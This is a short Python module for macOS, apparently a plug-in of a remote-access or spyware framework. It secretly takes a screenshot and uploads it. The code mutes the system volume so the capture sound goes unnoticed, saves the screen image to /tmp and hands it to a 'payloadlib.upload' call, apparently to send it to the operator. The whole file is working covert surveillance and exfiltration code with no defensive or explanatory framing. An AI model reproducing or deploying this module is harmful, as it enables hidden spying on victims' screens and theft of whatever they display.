'''
NAME: Screenshot
DESCRIPTION: Takes screenshot and downloads image, causes momentary volume drop
'''

import os
import sys
import subprocess
import datetime

check_volume = 'set ovol to output volume of (get volume settings)\nreturn ovol'
set_volume = "osascript -e 'set volume output volume {}'"

proc = subprocess.Popen(['osascript', '-'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE)

out, err = proc.communicate(check_volume.encode('UTF-8'))
vol = out.decode('UTF-8')

filename = '/tmp/screen-{}.png'.format(datetime.datetime.now().strftime('%Y-%m-%d-%H-%M'))


os.system(set_volume.format('0'))
if os.system('screencapture '+filename) == 0:
    sys.stdout.write("Screenshot successful\n")
    payloadlib.upload(filename)
else:
    sys.stderr.write("Screenshot failed\n")
os.system(set_volume.format(vol))